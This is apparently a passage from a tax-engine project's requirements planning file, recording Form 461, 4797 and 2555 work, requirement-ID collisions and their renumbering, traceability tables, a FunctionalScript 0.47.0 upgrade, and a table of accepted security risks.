      sixteen printed lines, computed from `fjs/schedule/1` Part I over printed Schedule 1
      lines 3, 4, 5 and 6 and 1040 line 7a, with printed line 8p as the destination. Spec:
      `fjs/form461/todo/limitation-on-business-losses.md`.

      **Delivered 2026-08-19, and NO kind was reclassified.** `excessBusinessLossAdjustment`
      stays in `unmodeledKindRefusals`: the kind names the adjustment on printed line 8p, which
      exists only when there IS an excess business loss, and that case refuses — the disallowed
      amount is a §172 net operating loss carryover and `netOperatingLossDeduction` is itself a
      refused kind with no dialect behind it. Every count is unchanged (modeled 55, refused
      142, vocabulary 197, tripwires 11, dialects 30 known / 32 dropped).

      **What DID change is `fjs/schedule/f`: a net farm loss computes at printed box 36a.**
      i1040sf p10 disposes of §465 and §469 in one sentence on the taxpayer's own two stored
      answers, §461(l) is figured here over the aggregate, and §199A(c)(2)'s outbound
      carryforward reached a report field for the first time. Box 36b still refuses on §465.
      **`fjs/schedule/c`'s loss does not move**, and the reason is a dialect rather than a
      statute: `vnd.fjs.business_expenses` carries no field for printed line 32's at-risk box
      and none for material participation, so neither §465 nor §469 can be asked of a Schedule
      C business at all. `fjs/schedule/e/part_i`'s two loss refusals do not move either.

      **Three remedies were corrected for naming a form or a reason that had ceased to be
      true** — `excessBusinessLossAdjustment`'s, `farmIncomeOrLoss`'s and Schedule C's own line
      32 message — which is the same failure mode TAX-39's entry above records for Publication
      535. The TAX-30 body earlier in this document names §461(l) as standing behind Schedule
      C's §465 refusal; that clause is still TRUE as a statement about the statute's ordering
      and no longer true as a statement about what this engine cannot compute.

      **The threshold was verified at Rev. Proc. 2024-40 §2.32 rather than taken from the
      brief**, which is where the $313,000/$626,000 pair and its two per-status traps come
      from: married filing separately takes the FULL amount (§461(l) has no halving clause) and
      a qualifying surviving spouse does not file a joint return. The brief also said wages are
      trade-or-business income for this purpose; i461 says the opposite, in §461(l)(6)'s own
      words, and printed line 1 is *"Reserved for future use"* because of it.

### Form 4797 (TAX-41) — the SECOND `TAX-40` collision, split by its integrator

`feature/form-4797-impl` coined **`TAX-40`** for Form 4797 on 2026-08-19, on a branch cut from
`5d5fb7f` — before `feature/form-461`'s own `TAX-40` existed to be found. Both authors were
right to check and neither could have seen the other: the two IDs were coined the same day, on
branches with no common descendant, and the registry that resolves it is this file.

**This one IS split rather than recorded, and TAX-38's own note above is why.** That note
declined the split on a measured cost — *"renumbering 61 citations across fourteen files, six of
which name both forms, and two live branches are editing those files right now"* — and named who
should pay it instead: *"the split belongs to whoever integrates them, not to the retrofit that
found it."* This is that integration, and the cost here is **14 citations across six files**,
none of which name both forms, on a branch nothing is built on. Form 461 keeps `TAX-40` because
it is the one already on the trunk; Form 4797, the newcomer, takes `TAX-41`.

So the two collisions are recorded differently and for a stated reason, which is the point: TAX-38
records the tree's real state because splitting it was unsafe, and TAX-41 splits because it was
cheap. Neither is retconned — this paragraph is the history.

- [x] **TAX-41** *(M2, T3)*: **Schedule 1 line 4 — other gains or losses, §1231/§1245/§1250**
      — through **Form 4797**, Parts I, II and III, over a per-asset `disposal` block added to
      `vnd.fjs.asset_register`. Line 18b reaches Schedule 1 line 4 and 1040 line 8; a net
      §1231 gain on line 7 reaches Schedule D line 11 and 1040 line 7a; and the unrecaptured
      §1250 gain reaches Schedule D line 19 through the *Unrecaptured Section 1250 Gain
      Worksheet*'s lines 1 through 9, which `fjs/schedule/d` carried as a single documented zero
      until this phase. Spec: `fjs/form4797/todo/sales-of-business-property.md`.

      **Delivered.** `otherGainsOrLosses` left `unmodeledKindRefusals` for `modeledKinds`
      (`142 → 141` refused, `55 → 56` modeled), and a twelfth tripwire fires on a stored
      disposal that the return does not declare. `kindVocabulary` stays at 197. **No dialect was
      added**: the disposal block went on the register because four of the six figures Part III
      needs are already on the register asset and the only join key a separate document could
      use is `description`, a free-text field.

      **The finding is an ASYMMETRY, and it is the printed page's rather than this engine's.**
      §1231(c)'s five-year lookback lives on printed line 8, and the line 7 instruction says
      *"If line 7 is zero or a loss … skip lines 8 and 9."* So a net §1231 **loss** year
      is fully computable with no prior-year figure at all, and a net §1231 **gain** year is
      not — it needs `noNonrecapturedNetSectionOneTwoThreeOneLossesFromPriorYears` on
      `vnd.fjs.return_profile`, the state the same printed sentence names, and refuses at line 8
      without it. It is the exact mirror of `fjs/schedule/e/part_i`, where a PROFIT computes and
      a LOSS refuses because §469 sits on printed line 22.

      **Line 7 = 0 is the third case, and it is the common one.** §1245 caps the recapture at
      the total gain (line 25b is *"the smaller of line 24 or 25a"*), so an ordinary machine sold
      for less than it cost has line 32 = 0, line 7 = 0, and the whole gain ordinary on Schedule 1
      line 4 — no certification, no Schedule D. That is what makes the form worth having under
      a prior-year blocker.

      **Depreciation is derived allowed OR ALLOWABLE, never transcribed.** i4797 p9's line 22 Step
      1 recaptures what was allowable whether or not it was claimed, and
      `fjs/form4562/macrs`'s `macrsColumn` already produces the whole schedule from the unadjusted
      basis — the same property that let the register omit accumulated depreciation in the
      first place. `fjs/form4562/macrs` gained `disposalTwentyFourths`, Step 3's SECOND printed
      decimal column, which `fjs/form4562` now applies in the year of sale: without it every
      filer who sold something would have deducted a full year of depreciation on it.

      `noDepreciablePropertyDisposedOfDuringTheYear` is **NARROWED, not retired**. Form 4562
      requires it only when no disposal is recorded, and the dialect refuses a register carrying
      both. What replaced the blanket precondition is five named refusals, each on a disposal
      this engine cannot characterize: 15- and 20-year property (the class straddles §1245
      and §1250, and the two differ by the whole recapture), business use below 100% (the
      allocation moves a personal part to Schedule D), an asset placed in service and sold inside
      one tax year (i4562 states the no-depreciation rule for the mid-quarter convention only),
      a register bound to a stored farm (§1231(b)(3) livestock holding periods and §1252
      farmland), and a §1231 gain on a return that files no Schedule D.

### Form 2555 (TAX-42) — the THIRD `TAX-40` collision, and the most expensive to split

`feature/form-2555-impl` coined **`TAX-40`** for Form 2555 on 2026-08-19, on a branch cut from
`5d5fb7f` — the same commit `feature/form-4797-impl` was cut from, and for the same reason:
neither Form 461's `TAX-40` nor Form 4797's existed on any branch it could see. Three separate
works therefore coined one ID on one day, on three branches with no common descendant. That is
not three mistakes; it is one missing registry, consulted three times too late.

**This one is split too, and the cost was measured before the decision rather than after it.**
It is **88 citations across 23 files** — six times TAX-41's fourteen across six, and half again
the 61 across fourteen that TAX-38 declined. Eighty-five were renumbered mechanically; the other
three are this document's own, rewritten by hand into the record you are reading. Three things decided it anyway, and the first is
the one that matters:

- **Not splitting is not on offer.** TAX-38 could record one ID over two forms because neither
  entry had been written yet, so one entry could honestly describe both. Here `TAX-40` already
  carries a written body for Form 461 on the trunk. Keeping the ID would mean either two
  `- [x] **TAX-40**` entries in this document — which the `uniq -d` command below rejects and
  `planning-truth-gate.test.js` fails on — or fusing §461(l) and §911 into one entry that
  shares nothing. TAX-38 *recorded* a collision that had already happened; doing the same here
  would *manufacture* one.
- **The size of TAX-38's number was never the deciding fact — its ambiguity was.** Six of those
  61 citations named both forms, so each had to be read rather than substituted. **None of these
  88 names Form 461 or Form 4797.** Only three files carry a `TAX-40` from more than one of the
  three works at all — `.planning/REQUIREMENTS.md`, `CHANGELOG.md` and
  `fjs/schedule/1/module.f.js` — and in all three the two sets are disjoint paragraphs about
  disjoint statutes. TAX-38's other reason, *"two live branches are editing those files right
  now"*, has also expired: this is the integration it named as the payer.
- **The newcomer renumbers, by the rule TAX-41 set one section ago.** Form 461 keeps `TAX-40`
  because it was on the trunk first; Form 4797 took `TAX-41` for the same reason; Form 2555,
  integrated last and built on by nothing, takes **`TAX-42`**.

So the three collisions are now recorded three different ways, each with its reason on the page:
TAX-38 records the tree's real state because splitting it was unsafe, TAX-41 splits because it
was cheap, and TAX-42 splits because the alternative had stopped existing. None is retconned —
the traceability row below states the ID this work coined and who renumbered it, exactly as
TAX-41's does.

- [x] **TAX-42** *(M2, T3)*: **Form 2555 — the foreign earned income exclusion, §911** — Parts V,
      VII and VIII computed, reaching Schedule 1 line 8d → 1040 line 8, and repricing 1040 line 16
      through the **Foreign Earned Income Tax Worksheet** (§911(f)'s stacking rule). Spec:
      `fjs/form2555/todo/foreign-earned-income.md`.

      **Delivered.** `foreignEarnedIncomeForm2555` — one row naming three printed destinations —
      splits into FIVE, one modelled and four refused by name, and the split is the finding:
      the three destinations had three different blockers, so a filer with no housing claim was
      being refused by a row about a table they never needed. (**This entry read "four, one
      modelled and three refused" until the integration re-derived it**, while CHANGELOG.md on
      the same branch said five — the live table holds `foreignEarnedIncomeExclusion` modelled
      beside `foreignEarnedIncomeBonaFideResidenceTest`, `foreignHousingExclusionOrDeduction`,
      `foreignEarnedIncomeReceivedInAnotherTaxYear` and `foreignEarnedIncomeCapitalGainExcess`.
      The refused count moving `142 -> 145` for a split that removes one row and adds four is
      the arithmetic that gives it away, and nothing gated either sentence.)

      **The two qualifying tests are settled differently, and that asymmetry is the point.**
      Physical presence (§911(d)(1)(B)) is a COUNT and becomes a profile certification,
      deliberately narrower than the statute on its tax-home half. Bona fide residence
      (§911(d)(1)(A)) turns on *intent*, and i2555's own instruction says a taxpayer's words lose
      to their acts — so it is not certifiable at all and refuses.

      **The stacking rule is implemented rather than approximated**, and it is the requirement's
      whole risk: taxing only the remaining income under-taxes, silently, in the taxpayer's
      favour. `fjs/tax/line16`'s level-0a wrapper re-enters its own levels 1-3 with the
      worksheet's line 3, exactly as the printed page instructs, and refuses the one corner the
      page sends to a second modified worksheet (a capital gain excess). The alternative minimum
      tax's own Foreign Earned Income Tax Worksheet refuses where Form 6251 line 6 is positive.

      **Form 8962's structural zero goes live.** Its line 2a add-back was a documented zero *only
      while this kind stayed refused*; it is now a real term, wired and proven in
      `fjs/form1040/core` where a form-level proof cannot see it.

### v2 Traceability

| REQ-ID | Tier | Phase | Persona unblocked |
|--------|------|-------|-------------------|
| EXEC-14, PROV-09 | T0 | 21 - The Last Mile | *all four* — **both delivered** |
| TAX-19 | T0 | 22 - Computable Tripwires | *all four — the safety net* — **delivered** |
| TAX-20, TAX-21, TAX-22 | T1 | 23 - Schedule 2 Populated | **FAANG employee** — all three delivered |
| TAX-23, TAX-24, DOC-19 | T2 | 24 - Schedule 1 Adjustments | **Non-profit worker** — all three delivered |
| TAX-25, TAX-26 | T2 | 25 - Schedule 3 Credits | Non-profit worker — both delivered |
| TAX-27 | T2 | 32 - Earned Income Credit | Low-income working parent — the credit COMPUTES, on ten §32 facts added to `vnd.fjs.return_profile` |
| TAX-28, TAX-29 | T2 | 26 - Retiree Completion, 31 - Backdoor Roth | Retiree — TAX-28 delivered (Phase 26); **TAX-29 CLOSED in Phase 31**: Part II computed off Part I's own fraction, Part III's code `Q` computed and codes `J`/`T` refused by name, backdoor Roth computes end to end |
| DOC-20, DOC-21, TAX-30 | T3 | 27 - 1099-NEC and Schedule C | Startup founder — all three delivered |
| TAX-31, TAX-32 | T3 | 28 - Schedule SE and QBI; 31 - Form 8995-A | **Startup founder** — TAX-31 delivered in Phase 28; TAX-32 delivered Form 8995 there and Form 8995-A, Schedule A, the SSTB reduction and the W-2-wage/UBIA phase-in in Phase 31 |
| DOC-22, DOC-23, TAX-33, TAX-34 | T3 | 29 - Equity Compensation and AMT | **FAANG employee** — all four delivered. TAX-33 closed with Form 6251 Part III: an ISO spread beside qualified dividends computes end to end |
| DOC-24, TAX-35 | T3 | 30 - Pass-Through Income | **Startup founder** — DOC-24 delivered; **TAX-35 CLOSED**: Schedule E Part II end to end in Phase 30, Part III with the `vnd.fjs.k1_1041` dialect, and the routing half in three slices — sixteen separately stated boxes across three faces reach 1040 lines 2b/3a/3b and Schedule D lines 5/12 at sixteen different box numbers, with an eighth tripwire so the declaration-gated Schedule D destination is reachable rather than silently skipped |

| TAX-36, TAX-37 | T3 | *(none — retrofitted 2026-08-19)* | Tier-B forms — Schedule 3 line 1 under §904(j), and Form 8962 over the new `vnd.fjs.1095a`. Both were hard zeros; both now compute or refuse by name |
| TAX-38 | T3 | *(none — retrofitted 2026-08-19)* | Tier-B forms — **one ID, two forms**: Form 2441 (1040 line 1e and Schedule 3 line 2) and Form 6781 Part I (Schedule D lines 4 and 11). The collision is recorded in the section above, not retconned |
| TAX-39 | T3 | *(none — retrofitted 2026-08-19)* | Tier-B forms — Form 7206, §162(l), Schedule 1 line 17. The remedy it replaced named a publication the IRS withdrew in 2022 |
| TAX-40 | T3 | *(none — coined with its code 2026-08-19)* | Tier-B forms — Form 461, §461(l). No kind reclassified; a net farm loss computes at printed box 36a, and three stale remedies were corrected |
| TAX-41 | T3 | *(none — coined with its code 2026-08-19, as `TAX-40`, and renumbered by the integrator)* | Tier-B forms — Form 4797 over a per-asset `disposal` block on `vnd.fjs.asset_register`. Schedule 1 line 4 was a documented zero; a §1231 LOSS now computes with no prior-year figure and a §1231 GAIN refuses at printed line 8 without the return-profile certification |
| TAX-42 | T3 | *(none — coined with its code 2026-08-19, as `TAX-40`, and renumbered by the integrator)* | Tier-B forms — Form 2555, §911, Schedule 1 line 8d and 1040 line 16's Foreign Earned Income Tax Worksheet. One coarse kind became five, and Form 8962's documented structural zero became a live term |

**32 requirements across 10 phases, four retrofitted entries with none, and three coined with
their own code** — 129 in the document, 95 of them v1's and two v3's. Each phase is a
vertical slice that ends with something that works: a persona whose return computes, or a named
refusal that replaces a silent wrong answer. No phase leaves a layer that only pays off later.

> **That figure read 26 in this document's first draft.** Written by hand, one over, in the same
> file whose central lesson is that hand-written counts drift — and caught within a minute by the
> re-derivation command below, which is the entire argument for having one. Both figures here are
> now derived:
> ```sh
> ID='[A-Z]+(-[A-Z]+)*-[0-9]+'   # a prefix may carry a hyphen since FORM-KEY
> sed -n '/^## v1 Requirements/,/^## v2 Requirements/p'    .planning/REQUIREMENTS.md | grep -cE "^- \[[ x]\] \*\*$ID"   # 95
> sed -n '/^## v2 Requirements/,/^## v3 Requirements/p'    .planning/REQUIREMENTS.md | grep -cE "^- \[[ x]\] \*\*$ID"   # 32
> sed -n '/^## v3 Requirements/,/^## v2 (Deferred)/p'      .planning/REQUIREMENTS.md | grep -cE "^- \[[ x]\] \*\*$ID"   # 2
> grep -oE "^- \[[ x]\] \*\*$ID" .planning/REQUIREMENTS.md | grep -oE "$ID" | sort | uniq -d                            # must be empty
> ```

---

## v3 Requirements — Form-Accurate Identity Fields (FORM-KEY)

**Two IDs coined in code on 2026-08-21 and registered here on 2026-08-25.** Same admission as the
Tier-B retrofit above, and a worse instance of it: `FORM-KEY-01` and `FORM-KEY-02` were cited **65
times across 36 files** under `fjs/**` before this document had heard of either.

**What is new is why nothing caught it.** The Tier-B retrofit added a check that every ID the code
cites has a requirement behind it, and that check was green the whole time. It scans for ten
hand-typed prefixes, and `FORM-KEY` is not one of them; the test that guards *that* list compares
it against this document, where the prefix was equally absent. **Both sides agreed with each other
and both were wrong** — a prefix that exists only in the code is invisible to a check that asks the
code and the document whether they match. `planning-truth-gate.test.js` now classifies **every**
ID-shaped prefix in the tree as a requirement or as a declared non-requirement, which is the one
direction neither existing check could look. `FORM-KEY` is also the first prefix here to carry a
hyphen, and the three patterns that parse this file could not read it until they were widened —
registering these two was never a matter of typing two lines.

**Neither has a ROADMAP phase, and inventing one would be the tidy lie** — the same ruling the four
Tier-B IDs got, for the same reason. Both landed inside the accountant demo (PR #128), which
shipped outside the roadmap entirely. They are **T3** because nothing was blocked on them: no
subject string changed by a single byte.

- [x] **FORM-KEY-01** *(T3)*: **Each dialect declares which of its own fields play the subject
      roles.** DOC-01 fixes the Evo subject as `(formType, taxYear, payer, recipient, account)`,
      and `formSubject` used to read those five off field names it assumed every dialect shared —
      `payerTin`, `recipientTin`, `accountNumber`. That assumption is a claim about thirty separate
      printed forms, and it was never true of all of them. **28 dialect modules now export a
      `subjectKey`** naming their own fields for the five roles, so the mapping is each form's
      statement about itself rather than a convention imposed on it.

      One residual is filed rather than hidden: `fjs/document/todo/subject-key-roles-are-unpinned.md`
      records that the roles are not yet pinned by a type.

- [x] **FORM-KEY-02** *(T3)*: **Identity fields are named what the printed form calls them.**
      With FORM-KEY-01 in place, **eleven** dialects renamed their identity fields to the caption
      on the page — a W-2's box b is `employerEIN` and its box a is `employeeSSN`, and the words
      *payer* and *recipient* appear nowhere on that form. **Eleven, not twenty-two**: the other
      eleven in the original claim are the 1099s, whose printed faces really do say PAYER'S TIN and
      RECIPIENT'S TIN, and internal dialects that transcribe no form and so have no caption to
      defer to. **Subject strings are byte-identical across the rename** — the declaration moved,
      the values did not, and `goldenEncodedSubjectValue` is what says so.

### v3 Traceability

| REQ-ID | Tier | Phase | Delivered |
|--------|------|-------|-----------|
| FORM-KEY-01 | T3 | *(none — shipped outside the roadmap 2026-08-21, registered 2026-08-25)* | Complete — 28 dialect modules declare a `subjectKey`; `formSubject` no longer assumes a shared spelling |
| FORM-KEY-02 | T3 | *(none — shipped outside the roadmap 2026-08-21, registered 2026-08-25)* | Complete — eleven dialect modules renamed to the printed caption, subject strings byte-identical |

---

## v5 Requirements — A Current Engine and a Filable Return (MAINT, DOC)

**Six IDs coined here on 2026-08-27, before any of the code exists** — the opposite of the
Tier-B and `FORM-KEY` retrofits above, and recorded as such so the contrast is on the page.
`functionalscript` 0.47.0 shipped 2026-08-27T05:57Z, and the upgrade was measured in a
throwaway worktree before this section was written: the numbers below are observations, not
targets.

**Phases 34, 35 and 36 carry forward from v4 at their original numbers.** They map no
requirement — that was already true in v4 and stays true; see this document's v2 Tier-B
ruling for why a phase without an ID is preferable to an ID invented to give it one.

- [x] **MAINT-09** *(T3)*: **Take `functionalscript` 0.47.0.** The release carries 40
      changelog entries, 15 of them marked BREAKING, across 143 changed files. Exactly two
      reach this repository: `#1732`, which makes a bare `Struct` or `Tuple` schema **closed**
      and requires `dialectEntry` to take a schema with a stated rest, and `#1654`, which
      replaces `McpConfig.protocolVersion` with a non-empty latest-first `protocolVersions`.

      **The whole compatibility fix is behaviour-preserving**, and what establishes that is
      what the server serves, not the size of the diff: `open(c)` is documented upstream as
      exactly the old bare form, so 31 dialect registrations and 5 nested JSON-RPC response
      schemas state what they already relied on, and **`toJsonSchema` over all 30 dialect
      schemas is byte-identical to 0.46.1's output**. That holds only when `open()` is stated
      where each schema is **defined**; wrapping at the `dialectEntry(...)` call site instead
      moves 47 containers, each gaining an `additionalProperties`. Measured in a worktree on
      2026-08-27: `tsc` **0** (from 63 errors in 3 files), `npm test` green with no
      project-local proof leaf lost (8 leaves failed with the bump alone, all sharing one root
      cause), `ui-tests` **46/46**.

      *(This paragraph ended "Diff: 3 source files, +50 −49" until 2026-08-27. That was the
      call-site experiment ROADMAP.md rejects precisely because it changes the schemas the
      application serves — so it was being offered as evidence for the one claim it disproves.
      The `node --test` total quoted alongside it went at the same time, under the AGENTS.md
      rule that no phase is gated on the suite total.)*

      `^0.46.1` does not admit 0.47.0 — a caret on a `0.x` version pins the minor — so this
      is an explicit bump, not a refresh.

- [x] **MAINT-10** *(T3)*: **Retire the MCP protocol-version negotiation gap.**
      `fjs/server/module.f.js` documents its pinned version under the heading "The
      protocol-version pin is a known upstream gap, not a design choice". **0.47.0 closes
      that gap**: `initialize` echoes the client's requested revision when the server
      supports it and counter-proposes the latest supported one otherwise.

      Three things go with it. The docstring at lines 14–20 describes a gap that no longer
      exists. Three lines (23, 310, 495) cite
      `fjs/todo/upstream-mcp-protocol-version-negotiation.md`, a note already deleted in
      `7244f81` — the same dangling-prose class as the submodule text corrected in PR #137.
      And `proof.session.initializeIgnoresRequestedProtocolVersion` **still passes under
      0.47.0 for the wrong reason**: `protocolVersions` holds one entry, so the
      counter-proposal happens to equal the old unconditional pin, and the assertion survives
      the very change it was written to detect. It needs a two-entry list before it can tell
      the two behaviours apart.

      Whether `financeConfig` should advertise more than one revision now that it can is
      part of this requirement, not a separate one.

- [x] **DOC-25** *(T3)*: **A finance document is validated against its dialect on the write
      path.** `fjs/todo/no-dialect-validation-on-the-write-path.md` records, verified by
      reading production code, that no step between `evo_add`/`cas_add` and the stored
      program's `route` checks a blob against its dialect: upstream `cas_add` classifies
      against three upstream dialects, none of them a finance one, and `detectFinance` — which
      does carry the per-dialect semantic checks — reaches production at exactly one
      **read-only** site. A malformed `vnd.fjs.w2` is stored, routed, and computed from.

      It has not bitten because every producer calls its dialect's own `validate` before
      storing. **That is a convention among callers, not an enforced invariant.**

      This requirement is what makes MAINT-09's open-versus-closed question decide anything.
      With nothing validating on write, closing the dialects would be nearly free and nearly
      pointless — it would bite only `cas_refresh`'s read-only count report and the producers
      already validating voluntarily. **The honest ordering is the reverse of the obvious
      one: close the hole first, then choose.**

- [x] **MAINT-11** *(T3)*: **Adopt the 0.47.0 capabilities that remove code here.** Each is
      admitted on the ground that it deletes something, not that it is new: `fjs web [root]
      [port]`, a hardened static server, lets `demo/serve.sh` drop `python3 -m http.server`
      and serve the demo out of fjs itself — which is the functionalscript-only dependency
      rule reaching the one place it had not; `path.escapes` answers whether a `..` climbs
      above a root, which `parse` cannot; `toolResultStep` and `memoryRun` each remove
      hand-rolled wiring in `fjs/server`.

      `rest(c, r)` — a stated rest rather than the all-or-nothing of open versus closed — is
      listed here as available, and is the tool DOC-25 may want.


      **Outcome, 2026-08-31 (Phase 41): `toolResultStep` adopted at three sites; `fjs web` blocked
      upstream and filed.** `toolResultStep` deleted a `mapStep`/`catchStep` sandwich at each site
      and, in two modules, the `okResult`/`errorResult` imports entirely. `fjs web` was swapped into
      `demo/serve.sh` and reverted: it answers **413** for any file over one `Vec` (131072 bytes) and
      **eleven files the demo loads exceed that**, `fjs/form1040/core/module.f.js` at 995159 bytes
      being 7.6x the ceiling. The UI suite caught it — 44 of 46 failed with an empty `#dialect` —
      while every `curl` of an individual small path returned 200, so a smoke test would not have.
      Recorded in `fjs/todo/upstream-web-vec-size-limit.md`. `path.escapes` and `memoryRun` are
      **deliberately not adopted**: neither has a hand-rolled equivalent here to delete, which is
      this requirement's own criterion for adoption.
- [x] **MAINT-12** *(T3)*: **A consumer-side migration report for 0.47.0**, in the shape of
      `.planning/reports/fjs-0.46.1-migration.md`. Sergey asked for the 0.46 one explicitly
      in `todo/update-fjs-0.46.0` (PR #96): *"an extensive, structured report on the migration
      … whether you learned anything new and how you adapted to the project, as well as what
      the main challenges were."* It is the consumer's side of a release, and the thing a
      library author cannot see from where the library is authored.

      **It must record what this migration actually cost, including where it cost nothing** —
      a report that only lists breakage overstates the release. Two findings already belong
      in it: that a `git diff --stat` of 143 files predicted almost nothing about the blast
      radius, and that the failing proof in MAINT-10 is a check surviving the change it
      guards against.

- [x] **MAINT-13** *(T3)*: **An fjs gap may be taken upstream directly.** Standing authority
      granted by the owner on 2026-08-27: when this project reaches a gap in
      `functionalscript`, requesting the change or the new feature in that repository is an
      available move, not only the local workaround plus an `fjs/todo/upstream-*.md` note.

      This **extends** the existing rule rather than replacing it — a gap still gets its
      record, so nothing goes silent, and the record is what the upstream request is written
      from. It is the AGENTS.md ownership model (fjs is something this project owns and
      releases, not merely depends on) made actionable. `functionalscript#1645`, filed during
      the 0.46 migration, is the precedent this formalises.

### v5 Traceability

| REQ-ID | Tier | Phase | Milestone | Status |
|--------|------|-------|-----------|--------|
| MAINT-09 | T3 | 38. Take FunctionalScript 0.47.0 | v5 | Complete |
| MAINT-10 | T3 | 39. Retire the Protocol-Version Gap | v5 | Pending |
| DOC-25 | T3 | 40. Validation on the Write Path | v5 | Complete |
| MAINT-11 | T3 | 41. New Capabilities and the Migration Report | v5 | Partial - blocked upstream |
| MAINT-12 | T3 | 41. New Capabilities and the Migration Report | v5 | Complete |
| MAINT-13 | T3 | 41. New Capabilities and the Migration Report | v5 | Complete |

**Five columns, not four, because the gate reads the fifth.** `parseRequirements` in
`planning-truth-gate.test.js` takes a row's status from `columns[5]`, the shape of the `##
Traceability` table at the end of this file. This table was written in the four-column form the v2
and v3 sections use, which puts `Pending` in `columns[4]` and leaves the parsed status **empty** —
so the two checks that compare a checkbox against its row (`no requirement is ticked in its body
while its table Status says Pending`, and its converse) matched nothing here and would have gone on
matching nothing after all six were ticked. The v2 and v3 tables above have the same dead spot; they
are left as they are because their requirements are closed and re-shaping a settled ledger to satisfy
a parser is the tidier lie. A live milestone gets the shape that is actually checked.

**Phases 34, 35 and 36 map no requirement** and are listed here so the absence is deliberate
rather than an omission: 34 (Second-Implementation Cross-Check), 35 (A Filable Artifact —
fill the official `f1040.pdf`), 36 (The Conversational Path). All three are **T1** and all
three are blocked on the owner.

---

## v2 (Deferred)

- **Remote transport** — HTTPS + OAuth + tenancy, which is what ChatGPT support requires.
  Explicitly a milestone, per the client decision above.
- **Child-process isolation** with a wall-clock kill. The only way to bound a synchronous
  runaway from outside; a reliability fix as much as a security one.
- **Network egress control.** `--permission` has no network permission (see Accepted Risks).
- **A real FunctionalScript source validator** built on `fjs/js/tokenizer` + `fjs/bnf`, *if*
  it is ever wanted — for portability, not security. Multi-week upstream work.
- **Upstream contributions**: the restricted interpreter as a generic runner, the exact
  arithmetic module, the CAS effect vocabulary, and the `detect` dialect registry.
- **TY2024 and earlier parameter sets**, once TY2025 is proven.
- **"What if" scenarios as a named capability.** Program execution largely dissolves the
  feature — a scenario is another agent-authored program over branched inputs — but shipping
  it as a tested, named capability is v2.
- **TaxCalcBench as a graded acceptance harness** (51 public cases), pending a licensing and
  input-format check.

---

## Out of Scope

- **PDF text extraction in code** — permanently, not deferred. OCR is the agent's own vision
  pass emitting structured JSON. No PDF library, no OCR engine, no third-party service.
- **CSV / OFX / QFX parsers** — the vision-to-dialect path covers ingestion; a second
  parallel parser stack duplicates it for marginal gain.
- **State tax returns** — store W-2 boxes 15–20 faithfully, compute nothing.
- ~~**1099-NEC and self-employment** — the three-box simplicity is a trap; the downstream is
  Schedule C / SE / QBI.~~ **REVERSED by the owner on 2026-08-15.** Struck through rather than
  deleted, because the reason it was written is still true and is now a warning to whoever
  builds it: the 1099-NEC dialect is a morning's work and Schedule C → Schedule SE → Form 8995
  is the largest single body of work in the project. It moves to **v2 Phases 27-28**, not into
  v1. The trigger was a coverage survey (`.planning/PERSONA-COVERAGE.md`) showing this one
  entry is the *entire* startup-founder persona.
- **Non-US jurisdictions.**
- **Multi-user operation** — no auth, no tenancy, no per-user store isolation in v1.
- **E-filing or transmission** — output is figures to review and transcribe.
- **A `finance_compute_1040` tool** — would destroy the thesis permanently. The agent would
  call it and never author a program again. **STILL OUT OF SCOPE, and re-affirmed on
  2026-08-15** — see EXEC-14, which reaches the same end by the opposite route. The
  "last mile" as described in the 2026-08-15 handoff (*"a server tool that reads stored
  documents, assembles `Form1040Inputs`, and calls `form1040Report`"*) **is precisely this
  forbidden tool**, and would have been built without anyone noticing had the survey not
  re-read this list. The engine reaches guest programs through `guestCtx`, which already
  carries pure non-effect helpers (`step`, `pure`, `centsFromString`, `centsToString`) — so
  the agent still authors the program, and the frozen `CasOp` effect vocabulary does not
  widen by a single entry.
- **A "tax engine" module** — recreates precisely the thing the architecture exists to avoid.

---

## Accepted Risks

Recorded because "security will be worked on later" is a decision, and a decision deserves
to be written down with its consequences rather than left implicit.

| Risk | Status |
|---|---|
| **`import()` runs a blob's module body with full Node privileges** before any effect is interpreted. The operation whitelist does not cover it. | Accepted for v1. Mitigated in part by SEC-01 (`--permission`) and SEC-02 (specifier allow-list). Not closed. |
| **No network permission in Node's permission model.** A malicious module body can `fetch()` the complete tax record out. | Accepted and unmitigated in-process. An OS-level control (container, `sandbox-exec`, egress rule) was offered and deferred. |
| **The trust chain is untrusted document → LLM → generated program → execution.** Injection is unusually easy because "write a program and run it" is the sanctioned action. | Accepted. The compensating control is provenance discipline: only documents the user obtained themselves, in a session they initiated. |
| **CAS has no delete.** A wrongly ingested document — a spouse's return, a screenshot with a password — cannot be removed. | Mitigated by DOC-02 (project-local store) and DOC-15 (`archived` flag). Retraction remains a policy question, not a capability. |

---

## Traceability

Populated by the roadmapper from [`.planning/ROADMAP.md`](ROADMAP.md).
**All 95 requirements map to a phase. No orphans, no duplicates.** One — TEST-03 — maps to a
*range* of phases ("Phases 8-15, standing") rather than to one; the older wording of this
sentence said "exactly one phase" and was false for that row alone.

> **Two of these 95 (DOC-18, TAX-18) were written AFTER the code shipped.** The `vnd.fjs.1099g`
> dialect and its Schedule 1 line 7 wiring were built mid-session on 2026-08-14 in response to
> a real taxpayer document that the scope guard refused, entirely outside the GSD structure —
> no requirement, no phase, no CONTEXT or VALIDATION artifact. The retrofit (2026-08-15,
> commit `8d00990` for the code) assigns the IDs, adds **Phase 20** to the roadmap labelled as
> written after the fact, and subjects the work to the same verification gate every other
> phase cleared. **It is recorded as retrofitted rather than presented as planned**, because
> the value of this table is that its history is true, not that it is tidy.

Milestones are `todo/plan.md`'s weeks and keep its names; phases are sliced underneath
them. Week 0 is research's addition in front of the plan's Week 1.

> **This table's `Status` column is a SECOND SOURCE, and it rots.** The checkbox on each
> requirement above is what executors update; this column is not, and until 2026-08-08
> **28 rows said `Pending` for requirements whose checkbox already said `[x]`** — drift
> accumulated across Phases 3 through 12.1. Both were reconciled on that date (72 complete,
> 21 pending, 93 total).
>
> **Do not run the shell snippet that used to live here — it was wrong.** It compared every
> requirement ID against the v1 table below and accepted only the two exact words `Complete` and
> `Done`, so it printed **33 false mismatches**: 25 for the v2 requirements, which are traced in
> their own differently-shaped table and have no row here at all, and 8 more for rows whose Status
> is a sentence rather than a single word. A check that cries wolf 33 times gets ignored, which is
> what happened — the five rows that were genuinely wrong sat inside that noise.
>
> **The check is now a test, and the test is the specification:**
>
> ```sh
> node --test planning-truth-gate.test.js     # 9 leaves; part of `npm test`
> ```
>
> It compares the body checkboxes against BOTH traceability tables, in both directions, and
> accepts the real Status vocabulary instead of two hard-coded words. It also compares the tool
> and dialect counts claimed anywhere in `.planning/*.md` against the code. It found the five real
> rows on its first run — MAINT-02 through MAINT-06, ticked `[x]` with dated resolution notes
